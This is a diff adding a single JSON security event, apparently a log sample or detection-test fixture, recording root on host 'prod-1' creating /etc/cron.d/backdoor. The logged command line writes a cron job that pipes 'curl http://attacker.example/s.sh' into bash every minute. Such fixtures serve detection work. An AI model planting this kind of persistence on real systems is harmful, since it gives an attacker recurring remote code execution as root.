@@ -1,0 +1,7 @@
+{
+  "event": {"category": "file", "type": "change", "action": "created"},
+  "file": {"path": "/etc/cron.d/backdoor", "name": "backdoor"},
+  "process": {"name": "bash", "command_line": "bash -c \"echo '* * * * * root curl http://attacker.example/s.sh | bash' > /etc/cron.d/backdoor\"", "parent": {"name": "sshd"}},
+  "user": {"name": "root"},
+  "host": {"name": "prod-1"}
+}
